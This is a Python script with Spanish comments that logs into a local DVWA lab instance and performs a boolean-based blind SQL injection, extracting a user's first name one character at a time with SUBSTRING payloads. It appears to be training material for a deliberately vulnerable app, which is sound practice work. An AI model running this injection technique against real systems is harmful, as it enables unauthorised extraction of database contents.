import requests
from bs4 import BeautifulSoup
import string

# URLs
url_base = 'http://localhost'
login_url = f'{url_base}/login.php'
sqli_url = f'{url_base}/vulnerabilities/sqli_blind/'

# Credenciales
usuario = 'admin'
clave = 'csrf12345'

# Crear sesión
s = requests.Session()

print("🔐 Iniciando sesión en DVWA...")

# Obtener token de login
login_page = s.get(login_url)
soup = BeautifulSoup(login_page.text, 'html.parser')
token_input = soup.find('input', {'name': 'user_token'})
token = token_input['value'] if token_input else ''

# Enviar formulario de login
payload_login = {
    'username': usuario,
    'password': clave,
    'Login': 'Login',
    'user_token': token
}
login_response = s.post(login_url, data=payload_login)

if 'Login failed' in login_response.text:
    print("❌ Falló el login.")
    exit()

print("✅ Login exitoso.")

# Iniciar extracción por inyección ciega
print("\n🔎 Extrayendo el primer nombre del usuario con id=1...")

nombre = ""
pos = 1
while True:
    char_found = False
    for c in string.ascii_letters + string.digits + "_":
        payload = f"1' AND SUBSTRING(first_name,{pos},1) = '{c}' -- "
        res = s.get(sqli_url, params={'id': payload, 'Submit': 'Submit'})
        if "User ID exists in the database" in res.text:
            nombre += c
            print(f"🔠 Letra {pos}: {c}")
            pos += 1
            char_found = True
            break
    if not char_found:
        break

if nombre:
    print(f"\n✅ Nombre del usuario con ID=1: {nombre}")
else:
    print("\n❌ No se pudo extraer el nombre.")
